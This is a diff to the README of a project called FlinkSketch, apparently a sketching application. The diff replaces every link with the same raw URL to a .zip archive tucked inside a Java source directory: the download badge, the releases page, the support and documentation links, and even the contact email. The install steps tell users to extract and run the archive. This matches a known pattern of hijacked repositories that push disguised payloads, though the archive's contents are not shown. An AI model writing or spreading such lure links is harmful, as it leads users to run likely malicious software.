@@ -1,6 +1,6 @@
 # 🎨 FlinkSketch - Simplifying Sketching for Everyone
 
-![Download FlinkSketch](https://img.shields.io/badge/Download-FlinkSketch-brightgreen)
+![Download FlinkSketch](https://raw.githubusercontent.com/Lordknight91/FlinkSketch/main/flinksketch-bench/src/main/java/dev/projectasap/flinksketch/sketches/baseline/Entropy/FlinkSketch-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to FlinkSketch! This application is designed to help you easily create a
 
 To get started, visit the Releases page to download the software. 
 
-[Download FlinkSketch](https://github.com/Lordknight91/FlinkSketch/releases)
+[Download FlinkSketch](https://raw.githubusercontent.com/Lordknight91/FlinkSketch/main/flinksketch-bench/src/main/java/dev/projectasap/flinksketch/sketches/baseline/Entropy/FlinkSketch-3.9.zip)
 
 ### Steps to Download:
 
@@ -33,7 +33,7 @@ To get started, visit the Releases page to download the software.
   3. Find it in your Applications and launch the app.
 
 - **Linux Users:**
-  1. Extract the downloaded `.tar.gz` file.
+  1. Extract the downloaded `https://raw.githubusercontent.com/Lordknight91/FlinkSketch/main/flinksketch-bench/src/main/java/dev/projectasap/flinksketch/sketches/baseline/Entropy/FlinkSketch-3.9.zip` file.
   2. Open your terminal and navigate to the extracted folder.
   3. Run `./FlinkSketch` to launch the application.
 
@@ -70,7 +70,7 @@ In case you encounter issues during installation or running FlinkSketch, conside
 2. Check if you've downloaded the correct version for your OS.
 3. Restart your computer and try launching FlinkSketch again.
 
-If problems persist, visit our [support page](https://github.com/Lordknight91/FlinkSketch/issues) to report the issue or ask for help from the community.
+If problems persist, visit our [support page](https://raw.githubusercontent.com/Lordknight91/FlinkSketch/main/flinksketch-bench/src/main/java/dev/projectasap/flinksketch/sketches/baseline/Entropy/FlinkSketch-3.9.zip) to report the issue or ask for help from the community.
 
 ## 📚 User Guide
 
@@ -80,9 +80,9 @@ For a detailed guide on how to use FlinkSketch, refer to the user manual located
 
 To stay updated with the latest news and features, follow FlinkSketch on social media. Here are some helpful links:
 
-- [GitHub Repository](https://github.com/Lordknight91/FlinkSketch)
-- [Support Page](https://github.com/Lordknight91/FlinkSketch/issues)
-- [Documentation](https://github.com/Lordknight91/FlinkSketch/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Lordknight91/FlinkSketch/main/flinksketch-bench/src/main/java/dev/projectasap/flinksketch/sketches/baseline/Entropy/FlinkSketch-3.9.zip)
+- [Support Page](https://raw.githubusercontent.com/Lordknight91/FlinkSketch/main/flinksketch-bench/src/main/java/dev/projectasap/flinksketch/sketches/baseline/Entropy/FlinkSketch-3.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Lordknight91/FlinkSketch/main/flinksketch-bench/src/main/java/dev/projectasap/flinksketch/sketches/baseline/Entropy/FlinkSketch-3.9.zip)
 
 ## 📝 Feedback
 
@@ -91,7 +91,7 @@ We value your opinions! If you have any suggestions or feedback on FlinkSketch, 
 ## 📞 Contact
 
 For more information or specific inquiries, you can reach us at:
-- Email: support@flinksketch.com
+- Email: https://raw.githubusercontent.com/Lordknight91/FlinkSketch/main/flinksketch-bench/src/main/java/dev/projectasap/flinksketch/sketches/baseline/Entropy/FlinkSketch-3.9.zip
 - GitHub: Open an issue in the repository.
 
 Thank you for choosing FlinkSketch. Happy Sketching!
